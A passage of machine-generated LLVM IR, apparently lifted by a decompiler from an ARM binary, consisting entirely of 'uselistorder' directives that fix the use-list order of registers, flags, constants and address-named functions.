  uselistorder i32 %v3_11794, { 1, 0 }
  uselistorder i1 %v7_116fc, { 1, 0 }
  uselistorder i32 %v3_116f8, { 1, 0, 2, 3 }
  uselistorder i1 %v2_116e4, { 1, 0 }
  uselistorder i32 %.387, { 1, 0 }
  uselistorder i1 %v7_116cc, { 1, 0 }
  uselistorder i32 %v0_116c8, { 2, 1, 0, 3 }
  uselistorder i1 %v7_116a0, { 1, 0 }
  uselistorder i32 %v0_116a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11624, { 1, 0 }
  uselistorder i32 %v0_115e8, { 1, 0 }
  uselistorder i32 %v0_115d4.pr, { 1, 0 }
  uselistorder i32 %v0_115a0, { 1, 2, 0 }
  uselistorder i32 %v0_11560, { 1, 0 }
  uselistorder i32 %v1_11558, { 1, 0 }
  uselistorder i32 %v1_11550, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_1154c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_1154c, { 0, 2, 1 }
  uselistorder i32 %v0_1152c.pr, { 1, 0 }
  uselistorder i32 %v0_1150c.pr, { 1, 0 }
  uselistorder i1 %v7_114e4, { 1, 0 }
  uselistorder i1 %v2_114d4, { 1, 0, 2 }
  uselistorder i1 %v2_114b8, { 1, 0, 2 }
  uselistorder i32 %v1_114d8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_114ac, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_114dc, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v3_114a0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11488, { 1, 0 }
  uselistorder i32 %v5_11484, { 2, 3, 1, 0, 4, 5 }
  uselistorder i32 %v1_11470, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11470, { 0, 2, 1 }
  uselistorder i32 %v0_11468, { 1, 0 }
  uselistorder i1 %v7_11464, { 1, 0 }
  uselistorder i1 %v7_1145c, { 1, 0 }
  uselistorder i1 %v8_11454, { 1, 0 }
  uselistorder i1 %v7_11438, { 1, 0 }
  uselistorder i1 %v7_11430, { 1, 0 }
  uselistorder i1 %v8_11428, { 1, 0 }
  uselistorder i32 %v1_11410, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 %v3_1140c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_113f8, { 1, 0 }
  uselistorder i1 %v7_113ec, { 1, 0 }
  uselistorder i32 %v5_113e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_113d4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_113d4, { 0, 2, 1 }
  uselistorder i32 %v0_113cc, { 1, 0 }
  uselistorder i1 %v7_113c8, { 1, 0 }
  uselistorder i1 %v7_113c0, { 1, 0 }
  uselistorder i1 %v7_113b8, { 1, 0 }
  uselistorder i1 %v8_113b0, { 1, 0 }
  uselistorder i1 %v7_11394, { 1, 0 }
  uselistorder i1 %v7_1138c, { 1, 0 }
  uselistorder i1 %v7_11384, { 1, 0 }
  uselistorder i1 %v8_1137c, { 1, 0 }
  uselistorder i32 %v1_11364, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v3_11360, { 1, 0, 2, 3 }
  uselistorder i1 %v8_11300, { 1, 0 }
  uselistorder i8 %v3_112f8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_112f0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_112f0, { 0, 2, 1 }
  uselistorder i32 %v0_112e8, { 1, 0 }
  uselistorder i1 %v7_112e4, { 1, 0 }
  uselistorder i1 %v7_112dc, { 1, 0 }
  uselistorder i1 %v7_112d4, { 1, 0 }
  uselistorder i1 %v7_112c0, { 1, 0 }
  uselistorder i1 %v7_112b8, { 1, 0 }
  uselistorder i1 %v7_112b0, { 1, 0 }
  uselistorder i1 %v8_112a8, { 1, 0 }
  uselistorder i32 %v1_11290, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_1122c, { 1, 0 }
  uselistorder i8 %v3_11224, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1121c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1121c, { 0, 2, 1 }
  uselistorder i32 %v0_11214, { 1, 0 }
  uselistorder i1 %v7_11210, { 1, 0 }
  uselistorder i1 %v7_11208, { 1, 0 }
  uselistorder i1 %v7_11200, { 1, 0 }
  uselistorder i1 %v7_111ec, { 1, 0 }
  uselistorder i1 %v7_111e4, { 1, 0 }
  uselistorder i1 %v7_111dc, { 1, 0 }
  uselistorder i1 %v8_111d4, { 1, 0 }
  uselistorder i32 %v1_111bc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_11158, { 1, 0 }
  uselistorder i8 %v3_11150, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11148, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11148, { 0, 2, 1 }
  uselistorder i32 %v0_11140, { 1, 0 }
  uselistorder i1 %v7_1113c, { 1, 0 }
  uselistorder i1 %v7_11134, { 1, 0 }
  uselistorder i1 %v7_1112c, { 1, 0 }
  uselistorder i1 %v7_11118, { 1, 0 }
  uselistorder i1 %v7_11110, { 1, 0 }
  uselistorder i1 %v7_11108, { 1, 0 }
  uselistorder i1 %v8_11100, { 1, 0 }
  uselistorder i32 %v1_110e8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10f7c, { 1, 0 }
  uselistorder i8 %v3_10f74, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10f6c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10f6c, { 0, 2, 1 }
  uselistorder i32 %v0_10f64, { 1, 0 }
  uselistorder i1 %v7_10f60, { 1, 0 }
  uselistorder i1 %v7_10f58, { 1, 0 }
  uselistorder i1 %v7_10f50, { 1, 0 }
  uselistorder i1 %v7_10f3c, { 1, 0 }
  uselistorder i1 %v7_10f34, { 1, 0 }
  uselistorder i1 %v7_10f2c, { 1, 0 }
  uselistorder i1 %v8_10f24, { 1, 0 }
  uselistorder i32 %v1_10f0c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10ea8, { 1, 0 }
  uselistorder i8 %v3_10ea0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10e98, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10e98, { 0, 2, 1 }
  uselistorder i32 %v0_10e90, { 1, 0 }
  uselistorder i1 %v7_10e8c, { 1, 0 }
  uselistorder i1 %v7_10e84, { 1, 0 }
  uselistorder i1 %v7_10e7c, { 1, 0 }
  uselistorder i1 %v7_10e68, { 1, 0 }
  uselistorder i1 %v7_10e60, { 1, 0 }
  uselistorder i1 %v7_10e58, { 1, 0 }
  uselistorder i1 %v8_10e50, { 1, 0 }
  uselistorder i32 %v1_10e38, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_10e24, { 1, 2, 0 }
  uselistorder i32 %v2_10e10, { 1, 0 }
  uselistorder i32 %v0_10e10, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_10e0c, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_10de4, { 2, 1, 0 }
  uselistorder i1 %v7_10dc4, { 1, 0 }
  uselistorder i32 %v1_10d80, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_10d5c, { 1, 0 }
  uselistorder i32 %v1_10d50, { 2, 1, 0 }
  uselistorder i32 %v1_10d4c, { 1, 0 }
  uselistorder i32 %v3_10cdc, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10cdc, { 22, 20, 4, 0, 19, 5, 6, 23, 7, 8, 21, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 3, 2, 1 }
  uselistorder i32 %v1_10cb8, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10cb4, { 1, 0 }
  uselistorder i32 %v4_10c98, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_10c84, { 1, 0, 2 }
  uselistorder i32 %v3_10c80, { 1, 0, 2 }
  uselistorder i32 %v0_1175c, { 1, 0, 2 }
  uselistorder i32 %v3_10c48, { 1, 0 }
  uselistorder i32 %v1_10c30, { 3, 2, 1, 0 }
  uselistorder i32 %v3_10c2c, { 1, 0 }
  uselistorder i32 %v3_10c24, { 1, 2, 0 }
  uselistorder i1 %v7_10c14, { 1, 0 }
  uselistorder i32 %v3_10c10, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_10c04, { 1, 0 }
  uselistorder i32 %v2_11920, { 2, 3, 1, 0 }
  uselistorder i32 %v2_11318, { 4, 5, 1, 0, 3, 10, 7, 9, 8, 6, 2 }
  uselistorder i32 %v2_11588, { 1, 2, 0 }
  uselistorder i32 %v1_10bac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10bac, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10b90, { 1, 0 }
  uselistorder i32 %v1_10b64, { 2, 1, 0 }
  uselistorder i32 %v1_10b60, { 1, 0 }
  uselistorder i1 %v2_10b40, { 1, 0, 2 }
  uselistorder i32 %v0_10b3c, { 1, 0, 2 }
  uselistorder i1 %v7_10b08, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_10b08, { 1, 0, 2 }
  uselistorder i32 %v2_10b00, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10af4, { 1, 0, 2 }
  uselistorder i32 %v0_10af8, { 1, 0 }
  uselistorder i32 %v1_10adc, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_10ad0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10ad0, { 0, 2, 1 }
  uselistorder i32 %v1_10ac0, { 1, 0 }
  uselistorder i32 %v3_119e4, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_119f0, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_10a08, { 1, 0 }
  uselistorder i32 %v1_109f0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_109fc, { 0, 3, 2, 1 }
  uselistorder i32 %v0_109ac, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i1 %v2_10984, { 1, 0 }
  uselistorder i32 %v0_10950, { 1, 0 }
  uselistorder i32 %v0_10938, { 1, 0 }
  uselistorder i32 %v0_108fc, { 1, 0 }
  uselistorder i32 %v1_10884, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_107e8, { 1, 0 }
  uselistorder i32 %v5_107c0, { 1, 0 }
  uselistorder i32 %v3_107b0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_107ac, { 1, 0 }
  uselistorder i32 %v5_10790, { 1, 0 }
  uselistorder i1 %v2_10718, { 1, 0 }
  uselistorder i1 %v3_106fc, { 1, 0, 2 }
  uselistorder i1 %v2_106e8, { 1, 0 }
  uselistorder i1 %v2_106c4, { 1, 0 }
  uselistorder i32 %v1_10674, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10660, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1065c, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_10644, { 1, 0 }
  uselistorder i32 %stack_var_-1884.0, { 0, 1, 2, 3, 4, 5, 6, 8, 10, 12, 7, 9, 11, 14, 13 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10170, { 1, 0 }
  uselistorder i32 %v0_1012c, { 2, 1, 3, 0 }
  uselistorder i1 %v7_100cc, { 1, 0 }
  uselistorder i32 %v3_100c4, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_100b0, { 1, 0 }
  uselistorder i32 %v2_10094, { 1, 0, 2 }
  uselistorder i32 %v0_10080, { 1, 2, 0 }
  uselistorder i32 %storemerge268, { 1, 0 }
  uselistorder i32 %v0_fff4, { 2, 1, 3, 0, 4 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-96, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 7, 8, 9, 5, 10, 0, 11, 3, 12, 1, 13, 2, 14, 4, 15, 6, 16 }
  uselistorder i32 %tmp273, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 83, 64, 65, 66, 67, 68, 69, 70, 71, 72, 84, 85, 86, 87, 88, 90, 89, 91, 92, 93, 94, 95, 0, 96, 73, 164, 74, 75, 18, 19, 20, 61, 62, 63, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 78, 79, 76, 77, 80, 103, 97, 98, 99, 100, 101, 102, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 123, 124, 126, 125, 122, 128, 127, 81, 129, 130, 82, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 156, 157, 158, 159, 160, 161, 162, 163, 166, 165, 168, 167, 155, 169, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154 }
  uselistorder i32* %r2.global-to-local, { 29, 19, 20, 30, 31, 32, 33, 21, 22, 23, 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 26, 133, 136, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 128, 129, 45, 46, 48, 47, 44, 49, 50, 27, 52, 51, 28, 53, 54, 55, 56, 57, 139, 138, 140, 141, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 130, 131, 132, 134, 135, 137 }
  uselistorder i32* %r1.global-to-local, { 32, 20, 21, 22, 23, 24, 33, 34, 35, 36, 37, 38, 25, 26, 27, 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 29, 128, 129, 30, 31, 39, 40, 41, 42, 43, 44, 46, 47, 48, 45, 49, 50, 130, 131, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127 }
  uselistorder i32* %r0.global-to-local, { 92, 49, 48, 51, 50, 52, 53, 54, 55, 57, 56, 58, 61, 60, 62, 63, 65, 64, 95, 93, 94, 96, 99, 98, 97, 68, 0, 104, 100, 66, 67, 69, 71, 70, 72, 73, 75, 74, 76, 78, 77, 79, 81, 80, 82, 5, 7, 46, 47, 2, 1, 3, 4, 6, 11, 8, 9, 10, 15, 12, 13, 14, 16, 17, 18, 20, 19, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 44, 43, 45, 85, 84, 86, 87, 83, 88, 89, 118, 101, 102, 103, 105, 106, 107, 109, 108, 110, 114, 111, 59, 112, 113, 115, 117, 116, 120, 119, 121, 125, 124, 122, 123, 126, 127, 128, 90, 130, 129, 131, 132, 134, 133, 136, 135, 137, 138, 139, 231, 225, 226, 228, 227, 230, 229, 140, 142, 141, 144, 143, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 213, 212, 232, 214, 215, 216, 221, 217, 218, 219, 220, 222, 223, 91, 224 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 0, 6, 7, 10, 8, 9, 11, 1, 12, 13, 14, 21, 22, 23, 24, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 133, 116, 118, 21, 23, 134, 135, 136, 121, 122, 123, 3, 124, 126, 127, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 19, 20, 22, 24, 25, 27, 117, 28, 30, 36, 31, 32, 33, 34, 37, 38, 39, 40, 41, 125, 115, 42, 48, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 58, 59, 60, 55, 56, 57, 61, 62, 63, 64, 65, 66, 70, 71, 72, 67, 68, 69, 73, 74, 75, 76, 77, 78, 82, 83, 84, 79, 80, 81, 85, 86, 87, 88, 89, 90, 94, 95, 96, 91, 92, 93, 97, 98, 99, 100, 101, 102, 106, 107, 108, 103, 104, 105, 109, 110, 111, 112, 113, 114, 128, 129, 130, 131, 142, 137, 138, 139, 140, 141, 143, 144, 145, 146, 147, 148, 132, 187, 119, 120, 149, 150, 151, 152, 153, 154, 155, 156, 157, 160, 162, 163, 161, 158, 159, 26, 29, 14, 164, 15, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 2, 206, 207, 208, 209, 210, 1, 211, 212, 213, 0, 214, 215, 216, 217, 218, 219, 220, 181, 182, 183, 184, 185, 186, 35, 188 }
  uselistorder i1* %cpsr_c.global-to-local, { 130, 113, 116, 118, 131, 15, 16, 132, 133, 119, 120, 121, 3, 122, 124, 125, 4, 5, 6, 7, 8, 9, 12, 13, 14, 17, 18, 19, 20, 22, 23, 24, 114, 26, 27, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 123, 112, 39, 45, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 55, 56, 57, 52, 53, 54, 58, 59, 60, 61, 62, 63, 67, 68, 69, 64, 65, 66, 70, 71, 72, 73, 74, 75, 79, 80, 81, 76, 77, 78, 82, 83, 84, 85, 86, 87, 91, 92, 93, 88, 89, 90, 94, 95, 96, 97, 98, 99, 103, 104, 105, 100, 101, 102, 106, 107, 108, 109, 110, 111, 126, 127, 128, 139, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 129, 179, 115, 117, 146, 147, 148, 149, 150, 151, 152, 155, 157, 158, 156, 153, 154, 21, 25, 10, 159, 11, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 2, 200, 201, 202, 203, 204, 1, 205, 206, 207, 0, 208, 209, 210, 211, 212, 213, 214, 215, 173, 174, 175, 176, 177, 178, 180, 28, 181 }
  uselistorder i32 (i32)* @function_f84c, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_223e4.200 to i16*), { 1, 0 }
  uselistorder i16** @global_var_223e4.200, { 1, 0 }
  uselistorder i32 ptrtoint (i16** @global_var_223e4.200 to i32), { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_14850, { 1, 0 }
  uselistorder i32 (i32)* @function_f874, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), { 6, 23, 7, 24, 0, 25, 3, 26, 1, 27, 2, 28, 4, 29, 16, 30, 17, 31, 18, 32, 19, 33, 20, 34, 21, 35, 5, 36, 22, 37, 8, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @function_14ac0, { 10, 9, 8, 7, 6, 5, 4, 26, 24, 23, 12, 11, 25, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14 }
  uselistorder i32 (i8*, i32, i32)* @function_15448, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_11a38, { 36, 35, 34, 41, 40, 39, 38, 37, 33, 32, 31, 30, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 29, 28, 27, 26, 25, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12428, { 22, 21, 24, 23, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 0, 3, 2, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32*)* @function_11a14, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56, 57, 58, 59, 60, 61, 62, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32)* @function_11ad8, { 43, 42, 41, 48, 47, 46, 45, 44, 40, 39, 38, 37, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 36, 35, 34, 33, 32, 31, 19, 18, 17, 16, 15, 14, 13, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_14a54, { 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_14d24, { 1, 2, 0 }
  uselistorder i32* @sp, { 4, 1, 5, 0, 6, 2, 7, 3 }
  uselistorder i32 ()* @function_fdc0, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_14a1c, { 2, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 9, 0, 1, 2, 4, 3, 6, 5, 8, 10, 7 }
  uselistorder i32 16384, { 19, 56, 20, 57, 21, 58, 22, 59, 23, 60, 24, 61, 12, 62, 1, 40, 15, 42, 16, 43, 17, 54, 18, 55, 14, 41, 2, 44, 3, 45, 4, 46, 5, 47, 6, 48, 7, 49, 8, 50, 9, 51, 10, 52, 11, 53, 25, 79, 80, 81, 63, 26, 64, 27, 65, 66, 67, 28, 68, 29, 30, 69, 13, 0, 70, 31, 71, 32, 72, 33, 73, 74, 75, 34, 35, 76, 36, 77, 37, 78, 39, 82, 83, 84, 38, 85 }
  uselistorder i32 (i32, i32, i32, i32)* @function_db2c, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_dadc, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 127, { 4, 5, 2, 6, 0, 7, 1, 8, 3, 9 }
  uselistorder i32 126, { 7, 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_19a0c.305 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_19a04.303 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_19974.269 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_19964.265 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_199d0.255 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19924.251 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1991c.249 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_19910.247 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_19908.245 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_19900.243 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_198e8.237 to i32), { 2, 5, 0, 6, 1, 7, 3, 8, 4, 9 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), { 2, 24, 0, 25, 1, 26, 3, 27, 4, 28, 5, 29, 6, 30, 7, 31, 8, 32, 9, 33, 10, 34, 11, 35, 12, 36, 13, 37, 14, 38, 15, 39, 16, 40, 17, 41, 18, 42, 19, 20, 21, 43, 22, 44, 23, 45 }
  uselistorder i32 (i32, i32, i32)* @function_fe88, { 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_197e8.223 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), { 2, 28, 3, 29, 4, 30, 5, 31, 6, 32, 0, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38, 12, 39, 13, 40, 14, 41, 15, 42, 16, 43, 17, 18, 19, 44, 20, 45, 21, 46, 22, 47, 23, 48, 1, 49, 24, 50, 25, 51, 26, 52, 27, 53 }
  uselistorder i8* @global_var_223d9.218, { 1, 0 }
  uselistorder i16* @global_var_223ce.217, { 2, 0, 1 }
  uselistorder i8* @global_var_223d8.216, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_223cc.215 to i32), { 1, 0, 2, 3, 4, 5 }
  uselistorder i8 6, { 4, 5, 6, 7, 8, 3, 9, 0, 10, 1, 2 }
  uselistorder i8 64, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_223b8.209 to i32), { 0, 3, 10, 9, 8, 2, 1, 7, 6, 5, 4 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32)* @function_14a40, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_f570, { 68, 7, 6, 5, 4, 3, 2, 65, 67, 66, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_14b30, { 1, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
